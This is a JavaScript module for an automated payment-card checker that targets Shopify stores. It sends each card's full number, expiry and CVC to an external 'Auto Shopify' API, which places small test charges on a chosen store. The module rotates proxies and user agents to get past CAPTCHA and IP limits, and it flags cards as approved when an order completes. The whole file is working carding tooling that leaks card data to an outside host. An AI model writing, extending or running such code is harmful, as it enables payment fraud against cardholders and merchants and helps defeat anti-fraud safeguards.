import axios from 'axios';
import dns from 'dns';
import { promisify } from 'util';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';
import { API_USER_AGENTS, AUTO_SHOPIFY_API } from '../../utils/constants.js';

const dnsLookup = promisify(dns.lookup);

/**
 * Auto Shopify Client
 * Uses external Auto Shopify API for card validation (charge type)
 * 
 * API: https://autoshopi.up.railway.app/?cc=cc&url=site&proxy=proxy
 * 
 * Response examples:
 * Charge: { "Response": "Order completed 💎", "CC": "...", "Price": "1.59", "Gate": "Shopify Payments", "Site": "..." }
 * Declined: { "Response": "CARD_DECLINED", "CC": "...", "Price": "1.59", "Gate": "Shopify Payments", "Site": "..." }
 */
export class AutoShopifyClient {
    constructor(siteConfig, options = {}) {
        this.site = siteConfig;
        this.proxyManager = options.proxyManager || null;
        this.proxyString = options.proxyString || '';
        this.timeout = 60000;
        this.apiBaseUrl = AUTO_SHOPIFY_API.BASE_URL;
    }

    getRandomUserAgent() {
        return API_USER_AGENTS[Math.floor(Math.random() * API_USER_AGENTS.length)];
    }

    isIpAddress(str) {
        const ipv4Pattern = /^(\d{1,3}\.){3}\d{1,3}$/;
        const ipv6Pattern = /^[a-fA-F0-9:]+$/;
        return ipv4Pattern.test(str) || ipv6Pattern.test(str);
    }

    async resolveHostToIp(hostname) {
        if (this.isIpAddress(hostname)) {
            return hostname;
        }
        
        try {
            const result = await dnsLookup(hostname);
            return result.address;
        } catch (error) {
            throw new Error(`Cannot resolve proxy hostname: ${hostname}`);
        }
    }

    async buildProxyString(proxy) {
        if (!proxy) return '';
        
        if (typeof proxy === 'string') {
            try {
                const url = new URL(proxy);
                const ip = await this.resolveHostToIp(url.hostname);
                if (url.username && url.password) {
                    return `${ip}:${url.port}:${url.username}:${url.password}`;
                }
                return `${ip}:${url.port}`;
            } catch {
                return proxy;
            }
        }
        
        if (typeof proxy === 'object' && proxy.host && proxy.port) {
            const ip = await this.resolveHostToIp(proxy.host);
            if (proxy.username && proxy.password) {
                return `${ip}:${proxy.port}:${proxy.username}:${proxy.password}`;
            }
            return `${ip}:${proxy.port}`;
        }
        
        return '';
    }

    async resolveProxyString(proxyString) {
        if (!proxyString) return '';
        
        const parts = proxyString.split(':');
        if (parts.length < 2) return proxyString;
        
        const host = parts[0];
        const port = parts[1];
        const username = parts[2] || '';
        const password = parts.slice(3).join(':') || '';
        
        const ip = await this.resolveHostToIp(host);
        
        if (username && password) {
            return `${ip}:${port}:${username}:${password}`;
        }
        return `${ip}:${port}`;
    }

    createClient(proxy = null) {
        const config = {
            timeout: this.timeout,
            headers: {
                'User-Agent': this.getRandomUserAgent(),
                'Accept': 'application/json',
            }
        };

        if (proxy && typeof proxy === 'object' && proxy.host && proxy.port) {
            const proxyType = proxy.type || 'http';
            let proxyUrl;
            
            if (proxy.username && proxy.password) {
                proxyUrl = `${proxyType}://${encodeURIComponent(proxy.username)}:${encodeURIComponent(proxy.password)}@${proxy.host}:${proxy.port}`;
            } else {
                proxyUrl = `${proxyType}://${proxy.host}:${proxy.port}`;
            }
            
            if (proxyType === 'socks4' || proxyType === 'socks5' || proxyType === 'socks') {
                config.httpsAgent = new SocksProxyAgent(proxyUrl);
                config.httpAgent = new SocksProxyAgent(proxyUrl);
            } else {
                config.httpsAgent = new HttpsProxyAgent(proxyUrl);
                config.httpAgent = new HttpsProxyAgent(proxyUrl);
            }
        }

        return axios.create(config);
    }

    async getRotatedProxy() {
        if (this.proxyManager) {
            try {
                const proxy = await this.proxyManager.getNextProxy();
                return await this.buildProxyString(proxy);
            } catch {
                return '';
            }
        }
        return '';
    }

    async validateCard(cardInfo) {
        const startTime = Date.now();
        const MAX_CAPTCHA_RETRIES = 3;
        
        if (!this.site) {
            return { success: false, error: 'Site config is undefined', duration: 0 };
        }

        const siteUrl = this.site.prodUrl || this.site.baseUrl;
        if (!siteUrl) {
            return {
                success: false,
                error: 'Site not configured (missing URL)',
                duration: Date.now() - startTime
            };
        }

        let shopifyUrl = siteUrl;
        try {
            const urlObj = new URL(siteUrl);
            shopifyUrl = `${urlObj.protocol}//${urlObj.host}`;
        } catch {
            // Use as-is if not a valid URL
        }

        const cc = `${cardInfo.number}|${cardInfo.expMonth}|${cardInfo.expYear}|${cardInfo.cvc}`;

        let proxyString = '';
        if (this.proxyString) {
            try {
                proxyString = await this.resolveProxyString(this.proxyString);
            } catch (error) {
                return {
                    success: false,
                    error: error.message,
                    duration: Date.now() - startTime
                };
            }
        } else if (this.proxyManager) {
            proxyString = await this.getRotatedProxy();
        }

        for (let attempt = 1; attempt <= MAX_CAPTCHA_RETRIES; attempt++) {
            try {
                const client = this.createClient();
                
                const params = new URLSearchParams({
                    cc: cc,
                    url: shopifyUrl,
                    proxy: proxyString
                });

                const apiUrl = `${this.apiBaseUrl}?${params.toString()}`;
                const response = await client.get(apiUrl);
                const duration = Date.now() - startTime;

                if (!response.data) {
                    return {
                        success: false,
                        error: 'Empty response from API',
                        duration
                    };
                }

                const data = response.data;
                const responseText = (data.Response || data.response || '').trim();
                
                // Check for CAPTCHA_REQUIRED - retry with rotated IP
                if (responseText.toUpperCase().includes('CAPTCHA_REQUIRED') || responseText.toUpperCase().includes('CAPTCHA')) {
                    if (attempt < MAX_CAPTCHA_RETRIES) {
                        if (this.proxyManager) {
                            proxyString = await this.getRotatedProxy();
                        }
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        continue;
                    }
                    // All retries exhausted - signal to stop batch
                    return {
                        success: true,
                        body: JSON.stringify(data),
                        errorMessage: 'CAPTCHA_REQUIRED',
                        gateway: data.Gate || data.gate || 'Unknown',
                        price: data.Price || data.price || '0.00',
                        site: data.Site || data.site || shopifyUrl,
                        responseText: responseText,
                        isApproved: false,
                        isCaptcha: true,
                        shouldStopBatch: true,
                        duration
                    };
                }

                // Check for SITE DEAD - fail fast, stop batch
                if (responseText.toUpperCase().includes('SITE DEAD') || responseText.toUpperCase().includes('SITE_DEAD')) {
                    return {
                        success: true,
                        body: JSON.stringify(data),
                        errorMessage: responseText,
                        gateway: data.Gate || data.gate || 'Unknown',
                        price: data.Price || data.price || '0.00',
                        site: data.Site || data.site || shopifyUrl,
                        responseText: responseText,
                        isApproved: false,
                        isSiteDead: true,
                        shouldStopBatch: true,
                        duration
                    };
                }

                // Check for Price=0.00 with Unknown gate - treat as site error, stop batch
                const price = data.Price || data.price || '0.00';
                const gate = data.Gate || data.gate || 'Unknown';
                if (price === '0.00' && gate === 'Unknown') {
                    return {
                        success: true,
                        body: JSON.stringify(data),
                        errorMessage: responseText || 'Site error - invalid response',
                        gateway: gate,
                        price: price,
                        site: data.Site || data.site || shopifyUrl,
                        responseText: responseText,
                        isApproved: false,
                        isSiteDead: true,
                        shouldStopBatch: true,
                        duration
                    };
                }

                const isApproved = responseText.toLowerCase().includes('order completed') || 
                                  responseText.toLowerCase().includes('success') ||
                                  responseText.includes('💎');

                return {
                    success: true,
                    body: JSON.stringify(data),
                    errorMessage: isApproved ? null : responseText,
                    gateway: data.Gate || data.gate || 'Shopify Payments',
                    price: data.Price || data.price || '0.00',
                    site: data.Site || data.site || shopifyUrl,
                    responseText: responseText,
                    isApproved: isApproved,
                    duration
                };

            } catch (error) {
                const duration = Date.now() - startTime;
                
                if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
                    return {
                        success: false,
                        error: 'Request timeout',
                        duration
                    };
                }

                // Handle 503 Service Unavailable - retry with delay
                if (error.response?.status === 503) {
                    if (attempt < MAX_CAPTCHA_RETRIES) {
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Service unavailable after 3 retries',
                        duration
                    };
                }

                if (error.response) {
                    const errorMessage = error.response.data?.Error || error.response.data?.error || error.response.data?.message || `API error: ${error.response.status}`;
                    return {
                        success: false,
                        error: errorMessage,
                        duration
                    };
                }

                return {
                    success: false,
                    error: error.message || 'Unknown error',
                    duration
                };
            }
        }

        return {
            success: false,
            error: 'Max retries exceeded',
            duration: Date.now() - startTime
        };
    }
}
